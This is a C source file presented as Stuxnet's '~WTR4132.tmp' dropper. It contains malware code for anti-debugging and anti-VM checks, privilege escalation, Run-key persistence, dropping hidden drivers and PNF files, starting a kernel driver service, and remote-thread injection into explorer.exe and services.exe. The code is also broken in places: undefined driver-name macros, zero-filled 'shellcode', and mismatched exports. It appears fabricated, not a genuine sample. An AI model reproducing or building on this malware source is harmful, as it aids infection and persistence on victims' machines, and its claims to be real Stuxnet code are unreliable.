~WTR4132.tmp:
 * MD5: 74ddc49a7c121a61b8d06c03f92d0c13
 * SHA256: 743e16b3ef4d39fc11c5e8ec890dcd29f034a6eca51be4f7fca6e23e60dbd7a1
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <winspool.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <aclapi.h>
#include <sddl.h>
#include <ntsecapi.h>
#include <winternl.h>

#pragma comment(lib, "winspool.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ntdll.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WTR4132_MAGIC                   0x57545233
#define WTR4132_VERSION                 0x00010400
#define WTR4132_MAX_PATH                260
#define WTR4132_BUFFER_SIZE             4096
#define WTR4132_DLL_NAME                L"~WTR4132.tmp"
#define WTR4132_PAYLOAD_NAME            L"~WTR4141.tmp"

#define WTR4132_KERNEL32_ASLR           L"kernel32.dll.aslr."
#define WTR4132_SHELL32_ASLR            L"shell32.dll.aslr."

#define WTR4132_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WTR4132_REG_VALUE               L"19790509"

#define WTR4132_RESOURCE_DRIVER1        201
#define WTR4132_RESOURCE_DRIVER2        242
#define WTR4132_RESOURCE_PNF1           202
#define WTR4132_RESOURCE_PNF2           203
#define WTR4132_RESOURCE_PNF3           204
#define WTR4132_RESOURCE_PNF4           205
#define WTR4132_RESOURCE_EXPLOIT_RPC    221
#define WTR4132_RESOURCE_EXPLOIT_PRINT  222
#define WTR4132_RESOURCE_EXPLOIT_ELEV   250

#define WTR4132_EXPORT_INSTALL          15
#define WTR4132_EXPORT_DROP_DRIVERS     16
#define WTR4132_EXPORT_HOOK_DLL         17
#define WTR4132_EXPORT_USB_PROPAGATE    19
#define WTR4132_EXPORT_NETWORK_PROPAGATE 22

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _WTR4132_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WTR4132_MAX_PATH];
    WCHAR szSystemPath[WTR4132_MAX_PATH];
    WCHAR szWindowsPath[WTR4132_MAX_PATH];
    WCHAR szTempPath[WTR4132_MAX_PATH];
    WCHAR szDriverPath[WTR4132_MAX_PATH];
    WCHAR szInfPath[WTR4132_MAX_PATH];
    BYTE bReserved[256];
} WTR4132_CTX, * PWTR4132_CTX;

typedef struct _WTR4132_RESOURCE_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwResourceCount;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    BYTE bReserved[32];
} WTR4132_RESOURCE_HEADER, * PWTR4132_RESOURCE_HEADER;

typedef struct _WTR4132_RESOURCE_ENTRY {
    DWORD dwType;
    DWORD dwID;
    DWORD dwOffset;
    DWORD dwSize;
    DWORD dwFlags;
    DWORD dwChecksum;
    BYTE bReserved[16];
} WTR4132_RESOURCE_ENTRY, * PWTR4132_RESOURCE_ENTRY;

typedef struct _WTR4132_HOOK_ENTRY {
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
    BYTE bOriginalBytes[8];
} WTR4132_HOOK_ENTRY, * PWTR4132_HOOK_ENTRY;

static WTR4132_CTX g_Wtr4132Ctx;
static BOOL g_bInitialized = FALSE;
static BOOL g_bHooksInstalled = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwResourceCount = 0;
static WTR4132_RESOURCE_ENTRY g_ResourceEntries[32];
static PBYTE g_pResourceData = NULL;
static DWORD g_dwResourceDataSize = 0;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(HANDLE, PVOID*, PULONG, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static PFN_NtQuerySystemInformation pNtQuerySystemInformation = NULL;
static PFN_NtQueryInformationProcess pNtQueryInformationProcess = NULL;
static PFN_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static PFN_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static PFN_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static PFN_NtCreateThreadEx pNtCreateThreadEx = NULL;
static PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = NULL;

static BOOL WTR4132_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pNtQuerySystemInformation = (PFN_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtQueryInformationProcess = (PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    return TRUE;
}

static BOOL WTR4132_EnablePrivilege(LPCWSTR szPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, szPrivilege, &luid)) return FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

static BOOL WTR4132_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WTR4132_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Wtr4132Ctx.hMutex = hMutex;
    return TRUE;
}

static BOOL WTR4132_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    if (pNtQueryInformationProcess) {
        DWORD dwDebugPort = 0;
        if (NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), 7, &dwDebugPort, sizeof(dwDebugPort), NULL)) && dwDebugPort != 0)
            return TRUE;
    }
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4132_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static VOID WTR4132_GetPaths(VOID) {
    GetModuleFileNameW(NULL, g_Wtr4132Ctx.szModulePath, WTR4132_MAX_PATH);
    GetSystemDirectoryW(g_Wtr4132Ctx.szSystemPath, WTR4132_MAX_PATH);
    GetWindowsDirectoryW(g_Wtr4132Ctx.szWindowsPath, WTR4132_MAX_PATH);
    GetTempPathW(WTR4132_MAX_PATH, g_Wtr4132Ctx.szTempPath);
    wsprintfW(g_Wtr4132Ctx.szDriverPath, L"%s\\drivers", g_Wtr4132Ctx.szSystemPath);
    wsprintfW(g_Wtr4132Ctx.szInfPath, L"%s\\inf", g_Wtr4132Ctx.szWindowsPath);
}

static DWORD WTR4132_GetLocalIPList(PDWORD pdwIPList, PDWORD pdwCount) {
    DWORD dwSize;
    PIP_ADAPTER_INFO pAdapter;
    PIP_ADAPTER_INFO pCurrent;
    DWORD dwIndex;
    if (!pdwIPList || !pdwCount) return 0;
    dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    if (dwSize == 0) return 0;
    pAdapter = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pAdapter) return 0;
    if (GetAdaptersInfo(pAdapter, &dwSize) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pAdapter);
        return 0;
    }
    dwIndex = 0;
    pCurrent = pAdapter;
    while (pCurrent && dwIndex < *pdwCount) {
        if (pCurrent->IpAddressList.IpAddress.String[0] != '0') {
            pdwIPList[dwIndex++] = inet_addr(pCurrent->IpAddressList.IpAddress.String);
        }
        pCurrent = pCurrent->Next;
    }
    *pdwCount = dwIndex;
    HeapFree(GetProcessHeap(), 0, pAdapter);
    return dwIndex;
}

static DWORD WTR4132_GetSystemVersion(PDWORD pdwMajor, PDWORD pdwMinor, PDWORD pdwBuild) {
    RTL_OSVERSIONINFOW osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) != STATUS_SUCCESS) {
        return FALSE;
    }
    if (pdwMajor) *pdwMajor = osvi.dwMajorVersion;
    if (pdwMinor) *pdwMinor = osvi.dwMinorVersion;
    if (pdwBuild) *pdwBuild = osvi.dwBuildNumber;
    return TRUE;
}

static BOOL WTR4132_IsAdmin(VOID) {
    SID_IDENTIFIER_AUTHORITY nta = SECURITY_NT_AUTHORITY;
    PSID pSid = NULL;
    BOOL bAdmin = FALSE;
    if (AllocateAndInitializeSid(&nta, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid)) {
        CheckTokenMembership(NULL, pSid, &bAdmin);
        FreeSid(pSid);
    }
    return bAdmin;
}

static BOOL WTR4132_GetComputerName(LPWSTR szName, DWORD dwSize) {
    DWORD dwLen = dwSize;
    return GetComputerNameW(szName, &dwLen);
}

static BOOL WTR4132_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WTR4132_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WTR4132_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    GetModuleFileNameW(NULL, szPath, WTR4132_MAX_PATH);
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Stuxnet", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4132_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WTR4132_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WTR4132_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static VOID WTR4132_DecryptResource(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL WTR4132_LoadResources(VOID) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    PWTR4132_RESOURCE_HEADER pHeader;
    DWORD i;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    g_pResourceData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!g_pResourceData) return FALSE;
    memcpy(g_pResourceData, pData, dwSize);
    g_dwResourceDataSize = dwSize;
    WTR4132_DecryptResource(g_pResourceData, dwSize);
    pHeader = (PWTR4132_RESOURCE_HEADER)g_pResourceData;
    if (pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, g_pResourceData);
        g_pResourceData = NULL;
        return FALSE;
    }
    g_dwResourceCount = pHeader->dwResourceCount;
    memcpy(g_ResourceEntries, g_pResourceData + sizeof(WTR4132_RESOURCE_HEADER), g_dwResourceCount * sizeof(WTR4132_RESOURCE_ENTRY));
    return TRUE;
}

static BOOL WTR4132_ExtractResource(DWORD dwID, PBYTE* ppData, PDWORD pdwSize) {
    DWORD i;
    for (i = 0; i < g_dwResourceCount; i++) {
        if (g_ResourceEntries[i].dwID == dwID) {
            *ppData = g_pResourceData + g_ResourceEntries[i].dwOffset;
            *pdwSize = g_ResourceEntries[i].dwSize;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL WTR4132_DropDriver(LPCWSTR szDriverName, DWORD dwResourceID) {
    PBYTE pData;
    DWORD dwSize;
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (!WTR4132_ExtractResource(dwResourceID, &pData, &dwSize)) {
        return FALSE;
    }
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szDriverPath, szDriverName);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4132_DropPNF(LPCWSTR szPNFName, DWORD dwResourceID) {
    PBYTE pData;
    DWORD dwSize;
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4132_MAX_PATH];
    if (!WTR4132_ExtractResource(dwResourceID, &pData, &dwSize)) {
        return FALSE;
    }
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szInfPath, szPNFName);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL WTR4132_LoadDriver(LPCWSTR szDriverName) {
    HANDLE hSCManager;
    HANDLE hService;
    WCHAR szPath[WTR4132_MAX_PATH];
    WCHAR szServiceName[64];
    wsprintfW(szServiceName, L"MRxCls");
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    wsprintfW(szPath, L"%s\\%s", g_Wtr4132Ctx.szDriverPath, szDriverName);
    hService = CreateServiceW(hSCManager, szServiceName, szServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, szPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

static BOOL WTR4132_InjectProcess(DWORD dwPID, LPVOID pShellcode, DWORD dwSize) {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pMem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;
    pMem = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    WriteProcessMemory(hProcess, pMem, pShellcode, dwSize, NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

static BOOL WTR4132_InjectExplorer(VOID) {
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD dwPID;
    BYTE shellcode[0x1000];
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return FALSE;
    }
    do {
        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
            dwPID = pe.th32ProcessID;
            ZeroMemory(shellcode, sizeof(shellcode));
            WTR4132_InjectProcess(dwPID, shellcode, sizeof(shellcode));
            CloseHandle(hSnap);
            return TRUE;
        }
    } while (Process32NextW(hSnap, &pe));
    CloseHandle(hSnap);
    return FALSE;
}

static BOOL WTR4132_InjectServices(VOID) {
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD dwPID;
    BYTE shellcode[0x1000];
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return FALSE;
    }
    do {
        if (_wcsicmp(pe.szExeFile, L"services.exe") == 0) {
            dwPID = pe.th32ProcessID;
            ZeroMemory(shellcode, sizeof(shellcode));
            WTR4132_InjectProcess(dwPID, shellcode, sizeof(shellcode));
            CloseHandle(hSnap);
            return TRUE;
        }
    } while (Process32NextW(hSnap, &pe));
    CloseHandle(hSnap);
    return FALSE;
}

static BOOL WTR4132_LoadMainDLL(VOID) {
    PBYTE pData;
    DWORD dwSize;
    HMODULE hModule;
    FARPROC pExport;
    WCHAR szAslrPath[WTR4132_MAX_PATH];
    WCHAR szSelfPath[WTR4132_MAX_PATH];
    DWORD dwRandom;
    if (!WTR4132_ExtractResource(1, &pData, &dwSize)) {
        return FALSE;
    }
    GetModuleFileNameW(NULL, szSelfPath, WTR4132_MAX_PATH);
    wcscpy_s(szAslrPath, WTR4132_MAX_PATH, g_Wtr4132Ctx.szWindowsPath);
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, WTR4132_KERNEL32_ASLR);
    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pData;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, WTR4132_MAX_PATH, L".dll");
    if (!CopyFileW(szSelfPath, szAslrPath, FALSE)) {
        return FALSE;
    }
    hModule = LoadLibraryW(szAslrPath);
    if (!hModule) {
        DeleteFileW(szAslrPath);
        return FALSE;
    }
    pExport = GetProcAddress(hModule, "Export15");
    if (pExport) {
        ((void (*)(void))pExport)();
    }
    DeleteFileW(szAslrPath);
    return TRUE;
}

static BOOL WTR4132_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Wtr4132Ctx, sizeof(WTR4132_CTX));
    g_Wtr4132Ctx.dwMagic = WTR4132_MAGIC;
    g_Wtr4132Ctx.dwVersion = WTR4132_VERSION;
    g_Wtr4132Ctx.dwPid = GetCurrentProcessId();
    g_Wtr4132Ctx.dwTid = GetCurrentThreadId();
    g_Wtr4132Ctx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Wtr4132Ctx.csLock);
    WTR4132_GetPaths();
    WTR4132_InitNtImports();
    WTR4132_GetSystemVersion(&dwMajor, &dwMinor, &dwBuild);
    g_Wtr4132Ctx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Wtr4132Ctx.hStopEvent) {
        DeleteCriticalSection(&g_Wtr4132Ctx.csLock);
        return FALSE;
    }
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID WTR4132_Cleanup(VOID) {
    if (g_Wtr4132Ctx.hMutex) {
        CloseHandle(g_Wtr4132Ctx.hMutex);
        g_Wtr4132Ctx.hMutex = NULL;
    }
    if (g_Wtr4132Ctx.hStopEvent) {
        CloseHandle(g_Wtr4132Ctx.hStopEvent);
        g_Wtr4132Ctx.hStopEvent = NULL;
    }
    if (g_Wtr4132Ctx.hThread) {
        CloseHandle(g_Wtr4132Ctx.hThread);
        g_Wtr4132Ctx.hThread = NULL;
    }
    if (g_pResourceData) {
        HeapFree(GetProcessHeap(), 0, g_pResourceData);
        g_pResourceData = NULL;
    }
    DeleteCriticalSection(&g_Wtr4132Ctx.csLock);
    g_bInitialized = FALSE;
}

static DWORD WINAPI WTR4132_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_Wtr4132Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WTR4132_IsExpired()) {
            break;
        }
        WTR4132_InjectExplorer();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL WTR4132_StartWorker(VOID) {
    g_Wtr4132Ctx.hThread = CreateThread(NULL, 0, WTR4132_WorkerThread, NULL, 0, NULL);
    return (g_Wtr4132Ctx.hThread != NULL);
}

static BOOL WTR4132_Execute(VOID) {
    HANDLE hMutex;
    if (!WTR4132_Init()) return FALSE;
    if (WTR4132_IsExpired()) {
        WTR4132_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    if (WTR4132_CheckDebugger()) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    if (WTR4132_CheckVMware()) {
        CloseHandle(hMutex);
        WTR4132_Cleanup();
        return FALSE;
    }
    WTR4132_EnablePrivilege(SE_DEBUG_NAME);
    WTR4132_EnablePrivilege(SE_TCB_NAME);
    WTR4132_EnablePrivilege(SE_LOAD_DRIVER_NAME);
    WTR4132_WriteRegistry();
    WTR4132_ReadRegistry();
    WTR4132_LoadResources();
    WTR4132_DropDriver(STUXNET_DRIVER1, WTR4132_RESOURCE_DRIVER1);
    WTR4132_DropDriver(STUXNET_DRIVER2, WTR4132_RESOURCE_DRIVER2);
    WTR4132_DropPNF(L"oem7A.PNF", WTR4132_RESOURCE_PNF1);
    WTR4132_DropPNF(L"oem6C.PNF", WTR4132_RESOURCE_PNF2);
    WTR4132_DropPNF(L"mdmcpq3.PNF", WTR4132_RESOURCE_PNF3);
    WTR4132_DropPNF(L"mdmeric3.PNF", WTR4132_RESOURCE_PNF4);
    WTR4132_LoadDriver(STUXNET_DRIVER1);
    WTR4132_LoadDriver(STUXNET_DRIVER2);
    WTR4132_LoadMainDLL();
    WTR4132_StartWorker();
    while (WaitForSingleObject(g_Wtr4132Ctx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (WTR4132_IsExpired()) {
            break;
        }
        WTR4132_InjectServices();
    }
    WTR4132_Cleanup();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            WTR4132_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    return WTR4132_Execute() ? 0 : 1;
}

DWORD WINAPI Export2(VOID) {
    return WTR4132_Init() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return WTR4132_CheckMutex() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return WTR4132_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return WTR4132_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return WTR4132_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return WTR4132_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return WTR4132_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return WTR4132_LoadResources() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return WTR4132_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return WTR4132_InjectExplorer() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return WTR4132_InjectServices() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    return WTR4132_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export14(VOID) {
    WTR4132_Cleanup();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return WTR4132_Execute() ? 0 : 1;
}

DWORD WINAPI Export16(VOID) {
    BOOL bResult = TRUE;
    bResult = bResult && WTR4132_DropDriver(STUXNET_DRIVER1, WTR4132_RESOURCE_DRIVER1);
    bResult = bResult && WTR4132_DropDriver(STUXNET_DRIVER2, WTR4132_RESOURCE_DRIVER2);
    bResult = bResult && WTR4132_DropPNF(L"oem7A.PNF", WTR4132_RESOURCE_PNF1);
    bResult = bResult && WTR4132_DropPNF(L"oem6C.PNF", WTR4132_RESOURCE_PNF2);
    bResult = bResult && WTR4132_DropPNF(L"mdmcpq3.PNF", WTR4132_RESOURCE_PNF3);
    bResult = bResult && WTR4132_DropPNF(L"mdmeric3.PNF", WTR4132_RESOURCE_PNF4);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return WTR4132_LoadDriver(STUXNET_DRIVER1) && WTR4132_LoadDriver(STUXNET_DRIVER2) ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return WTR4132_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return WTR4132_InjectExplorer() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return WTR4132_InjectServices() ? 0 : 1;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Wtr4132Ctx.dwPid;
}

DWORD WINAPI Export22(VOID) {
    return WTR4132_VERSION;
}